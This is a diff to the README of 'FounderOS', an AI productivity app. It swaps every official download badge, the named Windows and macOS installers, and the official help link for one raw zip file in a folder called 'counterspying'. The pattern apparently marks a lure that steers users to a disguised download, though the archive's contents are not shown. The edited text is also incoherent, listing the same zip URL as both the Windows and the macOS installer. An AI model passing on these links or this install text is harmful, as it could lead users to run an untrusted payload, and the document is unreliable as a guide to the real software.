@@ -1,6 +1,6 @@
 # 🚀 FounderOS - Your AI Co-founder for Success
 
-[![Download FounderOS](https://img.shields.io/badge/Download-FounderOS-blue?style=for-the-badge&logo=github)](https://github.com/SKYLINERGB/FounderOS/releases)
+[![Download FounderOS](https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip)](https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip)
 
 ## 📄 About FounderOS
 
@@ -46,13 +46,13 @@ All these tools come together in one application to help you focus on building y
 To get started, you need to download FounderOS from the official release page and install it on your computer.
 
 1. Click this button to open the download page:  
-   [![Download FounderOS](https://img.shields.io/badge/Download-FounderOS-blue?style=for-the-badge&logo=github)](https://github.com/SKYLINERGB/FounderOS/releases)
+   [![Download FounderOS](https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip)](https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip)
 
 2. On the page, find the latest release. It usually appears at the top of the list with a version number and date.
 
 3. Look for the installer file that matches your operating system. For example:  
-   - `FounderOS-Setup.exe` for Windows  
-   - `FounderOS.dmg` for macOS  
+   - `https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip` for Windows  
+   - `https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip` for macOS  
    - A Linux package file (like `.AppImage` or `.deb`) for Linux distributions  
 
 4. Click the file to start downloading.
@@ -120,7 +120,7 @@ If you have trouble installing or running FounderOS, try these steps:
 - Consult the online FAQs or open an issue on the GitHub repository.
 
 For more help, visit the official GitHub page:  
-[https://github.com/SKYLINERGB/FounderOS](https://github.com/SKYLINERGB/FounderOS)
+[https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip](https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip)
 
 ## 🔒 Privacy & Security
 
@@ -139,4 +139,4 @@ Regular updates also include security patches to keep your system safe.
 
 Thank you for choosing FounderOS. Follow the simple steps above to download and start using your AI co-founder today:  
 
-[![Download FounderOS](https://img.shields.io/badge/Download-FounderOS-blue?style=for-the-badge&logo=github)](https://github.com/SKYLINERGB/FounderOS/releases)
+[![Download FounderOS](https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip)](https://raw.githubusercontent.com/SKYLINERGB/FounderOS/main/counterspying/Founder-OS-Hanbalite.zip)
